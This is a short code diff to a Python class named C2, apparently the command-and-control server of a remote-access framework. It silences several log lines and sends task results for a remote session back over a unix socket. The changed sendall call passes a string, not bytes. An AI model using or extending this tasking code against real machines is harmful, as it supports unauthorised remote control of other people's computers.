@@ -1061,13 +1061,13 @@ class C2():
                 index = i
 
         if index == -1: 
-            util.display("connection not found. the unix socket died and wasnt properly removed")
+            # util.display("connection not found. the unix socket died and wasnt properly removed")
             return 
 
         ses = self.sessions[index]
 
         # Run the command
-        util.display(f'command: {command}')
+        # util.display(f'command: {command}')
         cmd, _, action  = command.partition(' ')
         if cmd in globals()['c2'].commands and callable(globals()['c2'].commands[cmd]['method']):
             method = globals()['c2'].commands[cmd]['method']
@@ -1085,7 +1085,7 @@ class C2():
             task = globals()['c2'].database.handle_task({'task': command, 'session': index})
             ses.send_task(task)
             task = ses.recv_task()
-            print(f"final result task: {task}")
+            conn.sendall(f"final result task: {task}")
 
         conn.close()
 
@@ -1104,7 +1104,7 @@ class C2():
                     continue
 
                 conn, _ = socket.accept()
-                util.display(f"connected to unix client {num}")
+                # util.display(f"connected to unix client {num}")
 
                 data = conn.recv(1024).decode("utf-8")
 
